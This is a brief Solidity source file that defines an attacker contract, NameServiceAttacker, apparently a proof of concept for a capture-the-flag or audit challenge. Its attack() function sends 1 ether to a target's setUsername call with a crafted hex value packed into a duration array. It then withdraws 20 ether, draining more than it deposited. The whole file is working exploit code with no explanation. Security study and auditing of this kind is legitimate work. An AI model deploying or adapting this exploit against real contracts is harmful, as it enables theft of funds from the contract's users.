pragma solidity 0.7.0;

interface INameServiceBank {
    function setUsername(
        string memory newUsername,
        uint256 obfuscationDegree,
        uint256[2] memory _usernameSubscriptionDuration
    ) external payable;

    function withdraw(uint256 amount) external;
}

contract NameServiceAttacker {
    INameServiceBank public immutable target;

    constructor(INameServiceBank _target) {
        target = INameServiceBank(_target);
    }

    function attack() public payable {
        uint[2] memory duration = [0x73616d637a73756e414141414141414141414141414141414141414141414141, block.timestamp];
        target.setUsername{value: 1 ether}("", 8, duration);
        target.withdraw(20 ether);
    }

    receive() external payable {}
}
